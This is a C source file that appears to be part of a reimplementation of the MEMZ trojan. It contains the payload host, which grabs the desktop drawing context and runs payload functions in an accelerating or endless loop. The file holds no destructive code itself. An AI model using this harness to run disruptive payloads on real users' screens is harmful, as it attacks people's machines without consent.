#include <memz/def.h>
#include <memz/payload.h>
#include <memz/window.h>
#include <memz/cache.h>
#include <Windows.h>

static void cicle(payload_t* p, window_t* window)
{
    ((void (*)(window_t*))p->function)(window);
    Sleep(p->delay);

    p->delay -= p->accel;

    if (p->delay < p->min_delay)
        p->delay = p->min_delay;
}

void payload_host(void* pl)
{
    payload_t* p = (payload_t*) pl;

    /* Cheap to call, and it makes the cache usable even if a payload thread
     * is started before main() got around to it. */
    cache_init();

    window_t window;
    window.hwnd = GetDesktopWindow();
    window.hdc = GetWindowDC(window.hwnd);
    GetWindowRect(window.hwnd, &window.rect);

    /* Cache the derived geometry once instead of recomputing right-left and
     * bottom-top on every tick of every payload. */
    window.width = window.rect.right - window.rect.left;
    window.height = window.rect.bottom - window.rect.top;

    Sleep(p->start_delay * 1000);

    if (p->cicles == 0)
    {
        for(;;)
            cicle(p, &window);
    }
    else
    {
        for (int i = 0; i < p->cicles; ++i)
            cicle(p, &window);
    }
}
